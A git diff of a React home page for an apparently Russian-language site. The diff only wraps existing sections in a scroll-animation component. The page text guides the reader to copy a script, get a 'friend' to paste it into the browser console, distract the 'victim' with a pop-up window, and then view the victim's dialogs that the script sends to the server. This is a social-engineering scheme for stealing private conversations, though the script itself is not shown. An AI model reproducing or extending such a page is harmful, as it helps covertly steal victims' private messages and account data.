@@ -67,79 +67,89 @@ export default class Home extends React.Component {
 
 					<h1 className="home__block-title">Инструкия</h1>
 
-					<section className="home__section home__section-script">
-						<div className="home__section-wrapper container">
-							<div className="home__section-illustration">
-								<img src={code_img} alt="script image" />
-							</div>
-							<div className="home__section-content">
-								<h2 className="home__section-title">Скопируйте скрипт</h2>
-								<div className="home__section-description">
-									В разделе "получить скрипт" или по ссылке ниже скопируйте код.
-									<div className="home__section-link-wrapper">
-										<Link to="/get-script" className="home__section-link">
-											Получить скрипт
-										</Link>
+					<ScrollAppearance>
+						<section className="home__section home__section-script">
+							<div className="home__section-wrapper container">
+								<div className="home__section-illustration">
+									<img src={code_img} alt="script image" />
+								</div>
+								<div className="home__section-content">
+									<h2 className="home__section-title">Скопируйте скрипт</h2>
+									<div className="home__section-description">
+										В разделе "получить скрипт" или по ссылке ниже скопируйте
+										код.
+										<div className="home__section-link-wrapper">
+											<Link to="/get-script" className="home__section-link">
+												Получить скрипт
+											</Link>
+										</div>
 									</div>
 								</div>
 							</div>
-						</div>
-					</section>
+						</section>
+					</ScrollAppearance>
 
-					<section className="home__section home__section-console">
-						<div className="home__section-wrapper container">
-							<div className="home__section-illustration">
-								<img src={console} alt="script image" />
-							</div>
-							<div className="home__section-content">
-								<h2 className="home__section-title">Откройте консоль</h2>
-								<div className="home__section-description">
-									Попросите друга открыть консоль в браузере. На клавиатуре нужно
-									нажать <b>F12</b> или <b>ПКМ - Просмотреть код</b>. Откроется
-									панель разработчика. В верхней части в меню нужно выбрать пункт
-									<b> "Console"</b>.
+					<ScrollAppearance>
+						<section className="home__section home__section-console">
+							<div className="home__section-wrapper container">
+								<div className="home__section-illustration">
+									<img src={console} alt="script image" />
 								</div>
-							</div>
-						</div>
-					</section>
-
-					<section className="home__section home__section-console">
-						<div className="home__section-wrapper container">
-							<div className="home__section-illustration">
-								<img src={result} alt="script image" />
-							</div>
-							<div className="home__section-content">
-								<h2 className="home__section-title">Запустите скрипт</h2>
-								<div className="home__section-description">
-									Теперь в консоль нужно вставить скопированный ранее скрипт и
-									нажать
-									<b> enter</b>. Скрипт начнет свою работу. Чтобы "жертва" не
-									поняла, что происходит, откроется специальное окно, которое
-									отвлечет пользователя, exxexexxexe :&#41;
-								</div>
-							</div>
-						</div>
-					</section>
-
-					<section className="home__section home__section-console">
-						<div className="home__section-wrapper container">
-							<div className="home__section-illustration">
-								<img src={console} alt="script image" />
-							</div>
-							<div className="home__section-content">
-								<h2 className="home__section-title">Посмотрите результат</h2>
-								<div className="home__section-description">
-									Скрипт отправит полученные данные на сервер и вы сможете их
-									посмотреть.
-									<div className="home__section-link-wrapper">
-										<Link to="/dialogs" className="home__section-link">
-											Поиск диалогов
-										</Link>
+								<div className="home__section-content">
+									<h2 className="home__section-title">Откройте консоль</h2>
+									<div className="home__section-description">
+										Попросите друга открыть консоль в браузере. На клавиатуре
+										нужно нажать <b>F12</b> или <b>ПКМ - Просмотреть код</b>.
+										Откроется панель разработчика. В верхней части в меню нужно
+										выбрать пункт
+										<b> "Console"</b>.
 									</div>
 								</div>
 							</div>
-						</div>
-					</section>
+						</section>
+					</ScrollAppearance>
+
+					<ScrollAppearance>
+						<section className="home__section home__section-console">
+							<div className="home__section-wrapper container">
+								<div className="home__section-illustration">
+									<img src={result} alt="script image" />
+								</div>
+								<div className="home__section-content">
+									<h2 className="home__section-title">Запустите скрипт</h2>
+									<div className="home__section-description">
+										Теперь в консоль нужно вставить скопированный ранее скрипт и
+										нажать
+										<b> enter</b>. Скрипт начнет свою работу. Чтобы "жертва" не
+										поняла, что происходит, откроется специальное окно, которое
+										отвлечет пользователя, exxexexxexe :&#41;
+									</div>
+								</div>
+							</div>
+						</section>
+					</ScrollAppearance>
+
+					<ScrollAppearance>
+						<section className="home__section home__section-console">
+							<div className="home__section-wrapper container">
+								<div className="home__section-illustration">
+									<img src={console} alt="script image" />
+								</div>
+								<div className="home__section-content">
+									<h2 className="home__section-title">Посмотрите результат</h2>
+									<div className="home__section-description">
+										Скрипт отправит полученные данные на сервер и вы сможете их
+										посмотреть.
+										<div className="home__section-link-wrapper">
+											<Link to="/dialogs" className="home__section-link">
+												Поиск диалогов
+											</Link>
+										</div>
+									</div>
+								</div>
+							</div>
+						</section>
+					</ScrollAppearance>
 				</div>
 			</div>
 		);
